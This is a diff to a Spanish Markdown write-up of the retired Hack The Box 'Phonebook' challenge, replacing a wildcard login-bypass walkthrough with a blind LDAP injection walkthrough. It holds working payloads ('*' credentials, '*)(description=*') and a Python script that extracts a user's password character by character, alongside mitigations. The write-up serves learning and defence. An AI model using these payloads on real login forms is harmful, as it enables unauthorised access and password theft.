@@ -4,89 +4,75 @@ type: Web
 difficulty: Easy
 platform: Hack The Box
 state: Retired
-tags: [web, ldap, ldap-injection, auth-bypass]
+tags: [web, ldap, ldap-injection, blind-injection, auth-bypass]
 ---
 
 # Phonebook — Hack The Box
 
 [🇬🇧 English](README.en.md) | **Español**
 
-> **Estado:** Retired. Reto resuelto; sin flags reales.
+> **Estado:** Retired. Ficha de análisis; el flag no se publica.
 
-## TL;DR
+## Enunciado
 
-Una agenda de contactos con login. El formulario no monta una consulta SQL sino un filtro **LDAP**, y los comodines se cuelan sin escapar. `*` como usuario y como contraseña autentica, y el buscador devuelve todos los registros del directorio: entre ellos, el contacto que guarda la flag en su descripción.
-
-## Enunciado y superficie
-
-Aplicación Flask con dos pantallas: `/` (login) y `/home` (buscador de contactos por nombre).
+Una agenda web con login contra **LDAP**. El flag **no** es entrar: es la contraseña de un usuario concreta.
 
 ## Reconocimiento
 
-- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».
-
-## Análisis del código
-
-- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».
-
-## Explicación del fallo
-
-El código filtra con algo equivalente a:
-
-```python
-filtro = "(&(cn=%s)(password=%s))" % (usuario, password)
-con.search_s("dc=phonebook,dc=htb", ldap.SCOPE_SUBTREE, filtro)
+```bash
+gobuster dir -u http://<IP>:<PORT>/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
-Dos consecuencias:
+- `/` es el formulario de login; la lógica consulta un directorio LDAP con el usuario y la contraseña enviados.
+- Los errores se muestran en la propia URL: `/?message=Authentication failed`.
 
-1. Cualquier valor entra en el filtro, así que `*` actúa como comodín LDAP.
-2. Al devolver el primer resultado, un filtro que case con varios usuarios devuelve el primero del árbol.
+## El bypass que no basta
 
-## Reproducción local
-
-- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.
-
-## Explotación
+Con `*` en ambos campos, el filtro LDAP casa con cualquier entrada y la aplicación deja pasar:
 
 ```text
-usuario:  *
+username: *
 password: *
 ```
 
-`(&(cn=*)(password=*))` casa con cualquier entrada que tenga ambos atributos: sesión iniciada. En `/home`, el buscador sufre lo mismo:
+Entrar sirve para ver la aplicación, pero **no da el flag**. El objetivo es otro: la contraseña del usuario `reese`, que vive en el directorio.
+
+## Inyección LDAP ciega
+
+El formulario no devuelve datos del directorio, sólo un mensaje distinto según si la consulta tuvo éxito. Eso basta para extraer la contraseña **carácter a carácter**:
 
 ```text
-búsqueda: *
+username: reese
+password: <prefijo>*      # el prefijo del flag, un caracter mas cada vez
 ```
 
-Devuelve todos los contactos. En el listado aparece el usuario `admin` (o el que tenga permisos) con la flag en el campo `description`:
+Si `?message=Authentication failed` desaparece, el prefijo probado es correcto y se avanza con el siguiente carácter (el flag se escribe `HTB` + `{` + caracteres). Probando el juego de caracteres completo (`a-z`, `A-Z`, `0-9`, `_`, `}`) se reconstruye la contraseña entera.
 
-```text
-HTB{<flag>}
+```python
+import requests, string
+
+base = "http://<IP>:<PORT>/"
+known, alphabet = "HTB" + "{", string.ascii_letters + string.digits + "_{}-"
+while not known.endswith("}"):
+    for ch in alphabet:
+        r = requests.post(base, data={"username": "reese", "password": known + ch + "*"})
+        if "Authentication failed" not in r.text:
+            known += ch
+            print(known)
+            break
 ```
 
-Encadenado, un filtro más preciso sirve para enumerar atributos:
+El valor recuperado **es** el flag.
 
-```text
-*)(description=*
-```
+## Conclusiones
 
-## Evidencia
+- El bypass `*`/`*` es sólo el reconocimiento: confirma que la entrada se concatena en el filtro.
+- El flag se obtiene con **inyección LDAP ciega** usando el mensaje de error como oráculo.
+- La contraseña estaba en el directorio en claro, reutilizable como credencial.
 
-- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
-- Los valores reales viven en `private/` y no se publican.
+## Lecciones
 
-## Lecciones aprendidas
-
-- **Comillas y paréntesis**: si la app escapa `(`, `)` y `\`, `*` sigue funcionando porque no es un metacaracter de escape LDAP.
-- **Búsqueda vacía**: enviar cadena vacía devuelve el formulario otra vez; hay que enviar `*`.
-- **Login con `admin*`**: si el bind es por `cn`, `admin*` también entra y es más sigiloso que `*`.
-
-- LDAP no es SQL, pero la inyección es idéntica en concepto: entrada sin escapar dentro de un filtro.
-- Un comodín en el campo de contraseña convierte la autenticación en "existe el usuario".
-- Mitigación: `ldap.filter.escape_filter_chars()` en cada valor, bind con la cuenta del usuario y comparación de contraseña fuera del filtro.
-
-## Mitigaciones y detección
-
-- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.
+- Un login que acepta comodines está concatenando el filtro, no escapándolo.
+- En inyección ciega el oráculo es cualquier diferencia observable: aquí, el texto del mensaje.
+- Las contraseñas en LDAP no deben guardarse en claro ni ser el dato sensible del reto.
+- Mitigación: escapar los metacaracteres LDAP (`*`, `(`, `)`, `\\`), bind con cuenta de servicio y comparación de hash en el servidor.
